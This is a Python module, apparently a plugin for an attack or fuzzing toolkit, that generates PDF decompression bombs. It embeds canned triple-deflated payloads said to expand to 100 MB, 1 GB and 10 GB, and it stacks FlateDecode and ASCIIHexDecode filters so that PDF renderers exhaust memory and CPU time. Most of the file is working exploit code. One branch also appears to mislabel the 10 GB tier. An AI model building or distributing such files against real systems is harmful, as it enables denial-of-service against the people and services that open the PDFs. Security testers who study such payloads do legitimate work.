import zlib

from options import Options


options = Options()
options.add_option('target_payload_memory', 100000,
                   'Desired size of decompressed pdfstream in bytes (maximum 100000000000). Memory ceiling for time-effect bomb.')
options.add_option('time_multiplier', 1,
                   'Gives an additive effect to time usage, but may reduce max memory consumption. Set to 1 for no additional time effect (memory only)')

DESCRIPTION = 'Produces a pdf decompression bomb using pdfstream objects.'

NO_INPUT = True
DEFAULT_OUTPUT = 'file'
DEFAULT_OUTPUT_OPTIONS = {
    'final_newline': False,
    'format': 'binary'
}

CANNED_BOMBS = {"1G3Deflates": "78daabb8f5f68eaedf9c4489b68b9912cec2ff585496a44d6bcc34327dd1b58893a9f378a9c765d50decaf0c74182e6f605ee03939d2e12a87488ac666b62be57317c7fd3d619dbfeeb3fdff3c7db7ff67d5c2f5ebbfd7d5ca30323030309b57ffd9f8ede15bc3c87bf275b64c4091b67729d9c57ba458e7f5dbd716f2010524f6cc9fcfbf2ddc9e45ecfef963e7409a9ab7ff3699bf6e5bc3eea767cf997f070a341cac16e001d122078124438620982306e6742073466546654665466546658694ccb4d3cb7fbec9e59a714ff7bdf9357706863dd35fef3dfaefe5fbf08be657be0100d7d434e7",
                "100M3Deflates": "78daabb8f5f68ead1773a044ebc393fea989490b7bcf36ccf61036e0b8a6b9454c3c41f3c64c85752e2c9b1b741c3614b04b3916308669ae9972f18c5a4bf5bce5bbbe86cbe9bdbf7afbf9e33dbf8c57cbd7ddfb2e162dcac0c010b0e3e6ab65d76fdabc7af6b4a28a0b2830e55dcd86bbf9ee8def37ffed2c06f21d3ee61d5f9cf8db39a1b6f662391f5040e3debbebc71377b3da989f9e2bfc1d28d0f0682f171b48a5c84120c9704249024445b2300349859e041027459007a450a78911484d703500891de2006b12a3405391bddcd5d9ba093bf2f4fa77013df3a7ddf1f982eaef5fb885a6daec0600523f6540",
                "10G3Deflates": "78daedd9cf2b837100c7f1eff33c08adb4d22c19ab1d64c4fc385143ece6a2e5a031998c8b1c24ab69893121a9d19cfc88e2a024248d61c2c52c170b5ba310a5243f96dac6f37d4ebbb8baf85cbe4f9fefeb793fffc063ba7af697e55b9ba543b7626d4e4672ba27af4a315f9bbb7cc4be972a0c05464632b7ced9aa0d8c727044146d0d87baeb9a22939d2ebf63352bc5672f7fbb0c78afcf0c1d2c2164cc1fbe3776df7f17ead432d92cbd69e971ada965e36cb0cd697be077dfb93310bcceb024f6ea1b6b3c0c7fb3b015f9b0a8fc6ca623a4cbfe145e314b44f4997ac09fa45d2c0c8930866307040281402010080402814020100804028140201008e4cfc572b9cdd19f3ca4327a31d02067884a21585a33bddc49e4f8f34623a5a3d84d4f9338813ff7475574e8adb445820409122448902041820409122448902041820409122448902041f26bb2d97552226209894b92f74f2d664e0c4c2b1fc78b86d29f48a5c6b6677f3de448c598f0b50d294d2b466307040281402090ff2aa75f33c74bf12b3ed72e9dd1bb6987f7c5ccb9bdf5da1f7788109e",
}
UP_TO_CONTENT = "255044462d312e370a25e2e3cfd30a0a312030206f626a0a3c3c0a2f54797065202f436174616c6f670a2f4f75746c696e65732032203020520a2f50616765732033203020520a3e3e0a656e646f626a0a0a322030206f626a0a3c3c0a2f54797065202f4f75746c696e65730a2f436f756e7420300a3e3e0a656e646f626a0a0a332030206f626a0a3c3c0a2f54797065202f50616765730a2f436f756e7420320a2f4b696473205b2034203020525d0a3e3e0a656e646f626a0a0a342030206f626a0a3c3c0a2f54797065202f506167650a2f506172656e742033203020520a2f5265736f7572636573203c3c0a2f466f6e74203c3c0a2f46312039203020520a3e3e0a2f50726f635365742038203020520a3e3e0a2f4d65646961426f78205b302030203631322e30303030203739322e303030305d0a2f436f6e74656e7473205b"
CONNECTOR = "5d0a3e3e0a656e646f626a0a"
TAIL_END = "0a362030206f626a0a3c3c0a2f54797065202f506167650a2f506172656e742033203020520a2f5265736f7572636573203c3c0a2f466f6e74203c3c0a2f46312039203020520a3e3e0a2f50726f635365742038203020520a3e3e0a2f4d65646961426f78205b302030203631322e30303030203739322e303030305d0a2f436f6e74656e74732037203020520a3e3e0a656e646f626a0a0a392030206f626a0a3c3c0a2f54797065202f466f6e740a2f53756274797065202f54797065310a2f4e616d65202f46310a2f42617365466f6e74202f48656c7665746963610a2f456e636f64696e67202f57696e416e7369456e636f64696e670a3e3e0a656e646f626a0a0a31302030206f626a0a3c3c0a3e3e0a656e646f626a0a0a787265660a302031310a3030303030303030303020363535333520660a30303030303030303139203030303030206e0a30303030303030303933203030303030206e0a30303030303030313437203030303030206e0a30303030303030323232203030303030206e0a30303030303030333930203030303030206e0a30303030303031353232203030303030206e0a30303030303031363930203030303030206e0a30303030303032343233203030303030206e0a30303030303032343536203030303030206e0a30303030303032353734203030303030206e0a0a747261696c65720a3c3c0a2f53697a652031310a2f526f6f742031203020520a2f496e666f203130203020520a3e3e0a0a7374617274787265660a323731340a2525454f460a"


def run(output):
    if options['target_payload_memory'] >= 100000000000:
        raise ValueError("Cannot build pdf bombs with decompression payloads larger than 100GB. Exploit failed.")
    else:
        pdf_contents = construct_pdf(options['target_payload_memory'], options['time_multiplier'])
        output.output([pdf_contents])


def construct_pdf(target_size, time_multiplier):
    id_multiplicity = {"11": 1}
    time = (time_multiplier > 1)
    id_multiplicity = update_id(target_size, id_multiplicity)
    payloads = generate_payloads(target_size, id_multiplicity, time)
    # Makes a simple pdf with a single pdfstream object (as generated by whatever payload generator you want)
    streamlist = ""
    for id, multiplicity in id_multiplicity.items():
        streamlist += (id+" 0 R ")*multiplicity
    streamlist *= time_multiplier
    final = bytearray.fromhex(UP_TO_CONTENT) + streamlist.encode() + bytearray.fromhex(CONNECTOR) + payloads + bytearray.fromhex(TAIL_END)
    return final


def update_id(target_size, id_multiplicity):
    if target_size >= 100000000:
        hundreds_of_megs = get_digit(target_size, 8)
        id_multiplicity['12'] = hundreds_of_megs
        if target_size >= 1000000000:
            gigs = get_digit(target_size, 9)
            id_multiplicity['13'] = gigs
            if target_size >= 10000000000:
                tens_of_gigs = get_digit(target_size, 10)
                id_multiplicity['13'] = tens_of_gigs
    return id_multiplicity


def generate_payloads(target_size,id_multiplicity, time):
    payloads = b''
    for id, multiplicity in id_multiplicity.items():
        payloads += create_pdf_stream(target_size, id, time)
    return payloads


def deflate(size):
    string_to_compress = "3" * size  # This string is chosen to make use of ASCIIHexDecode for AC time effect
    compressed = zlib.compress(zlib.compress(zlib.compress(str.encode(string_to_compress), 9), 9), 9)
    return compressed.hex()


def filters(flates, asciihexdecodes, abbreviations):
    if abbreviations:
        return "/Fl "*flates + "/AHx "*asciihexdecodes
    else:
        return "/FlateDecode " * flates + "/ASCIIHexDecode " * asciihexdecodes


def create_pdf_stream(target_size, id, time):
    payload = ""
    if id == "11":
        if target_size % 100000000 != 0:
            payload = deflate(target_size % 100000000)
        else:
            payload = ""
    if id == "12":
        payload= CANNED_BOMBS['100M3Deflates']
    if id == "13":
        payload = CANNED_BOMBS['1G3Deflates']
    if id == "14":
        payload = CANNED_BOMBS['10G3Deflates']
    length = "9"  # This doesn't seem to affect much on most pdf renderers.
    asciihexdecodes = 0
    if time:
        asciihexdecodes = 8
    abbreviations = True
    stream = id.encode() + " 0 obj\n<</Filter [".encode()+filters(3, asciihexdecodes, abbreviations).encode() + "]\n/Length ".encode() + length.encode()+" >>\nstream\n".encode() + bytearray.fromhex(payload) + "\nendstream\nendobj\n\n".encode()
    return stream


def get_digit(number, n):
    return number // 10**n % 10
